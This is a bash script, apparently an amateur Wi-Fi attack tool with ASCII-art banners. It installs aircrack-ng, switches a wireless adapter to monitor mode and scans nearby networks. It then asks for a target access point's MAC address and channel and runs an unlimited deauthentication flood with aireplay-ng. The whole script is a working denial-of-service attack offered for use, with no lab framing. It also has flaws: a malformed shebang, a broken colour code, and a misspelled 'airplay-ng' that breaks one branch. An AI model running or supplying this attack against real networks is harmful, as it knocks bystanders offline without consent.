#!/bin/#!/usr/bin/env
# Black        0;30     Dark Gray     1;30
# Red          0;31     Light Red     1;31
# Green        0;32     Light Green   1;32
# Brown/Orange 0;33     Yellow        1;33
# Blue         0;34     Light Blue    1;34
# Purple       0;35     Light Purple  1;35
# Cyan         0;36     Light Cyan    1;36
# Light Gray   0;37     White         1;37
RED='\033[0;31m'
NC='\033[0m' # No Color
# printf "I ${RED}love${NC} Stack Overflow\n"
printf ${RED}
echo "                            ###"
echo "#########                ###   ##"
echo "####   ####               ###               ####  ##"
echo "####    ####    #####        ###           ##  #  ##"
echo "####    ####  ###   ###  ##   ###           ##    ######"
echo "####   ####   ###   ###   ##  ###   ###      ##   ##  ##"
echo "#########      ######      #####    ###   ####    ##  ##"
YELLOW='\033[1;33'
echo "   "
echo "  "
echo "Do you have aircrack-ng preinstalled? 1 - yes; 2 - no; 3 - What is aircrack-ng??????; "
read preinstalled
if [ $preinstalled -eq 1 ]
then
  echo "Good."
else
  sudo apt install aircrack-ng
fi
echo "                             __            __"
echo "                               \          /   "
echo "                                \        / "
echo "                                 \      / "
echo "                                  ####### "
echo "                                  #=O#=0#"
echo "                                   #[=]#"
echo "                                  ####   "
echo "                               #########"
echo "                              ######  ###       ##\\\ "
echo "                             ######    ###     ##  \\\ "
echo "                          #######       ####  ##    \\\ "
echo "                  #############          ### ##"
echo "              ###############             ###"
echo "         ##################%%%"
echo "      ###################   %%%"
echo "   ##################        %%%%%%%%"
echo "##################                  %%"
echo "                                    %%"
echo "    "
echo "    "
echo "    "
echo "Choose your wifi adapter: 1 - wlan1; 0 - wlan0; 3 - wlan0mon"
echo "OPTIONS BELLOW"
echo "    "
echo "    "
sleep 1s
echo "    "
iwconfig
read wifiadapter
if [ $wifiadapter -eq 1 ]
then
  sudo airmon-ng check kill
  sudo ifconfig wlan1 down
  sudo iwconfig wlan1 mode monitor
  sudo ifconfig wlan1 up
  echo "Ctrl + C"
  sleep 5s
  sudo airodump-ng wlan1
  echo "select mac address (SELECT, CTRL + C   CTRL + V)"
  read bssid
  echo "enter channel  (SELECT, CTRL + C   CTRL + V)"
  read channel
  echo "Ctrl + C when ready"
  echo "START"
  sudo airodump-ng -c $channel --bssid $bssid wlan1
  echo "Ctrl + C when ready"
  sleep 1s
  echo "STARTING ATTACK on $bssid on channel $channel"
  sudo airplay-ng --deauth 0 -a $bssid wlan1
elif [ $wifiadapter -eq 0 ]
then
  sudo airmon-ng check kill
  sudo ifconfig wlan0 down
  sudo iwconfig wlan0 mode monitor
  sudo ifconfig wlan0 up
  echo "Starting scanning in 5 seconds. Press Ctrl + C when scanning is over"
  sleep 5
  sudo airodump-ng wlan0
  echo "select mac addes   (SELECT, CTRL + C   CTRL + V)"
  read bssid1
  echo "enter channel   (SELECT, CTRL + C   CTRL + V)"
  read channel1
  echo "Ctrl + C when ready"
  sudo airodump-ng -c $channel1 --bssid $bssid1 wlan0
  sleep 2s
  echo "  "
  echo "  "
  echo "STARTING ATTACK on $bssid1 on channel $channel1 "
  echo "  "
  echo "  "
  sleep 4s
  sudo aireplay-ng --deauth 0 -a $bssid1 wlan0
else
  echo "Error"
fi
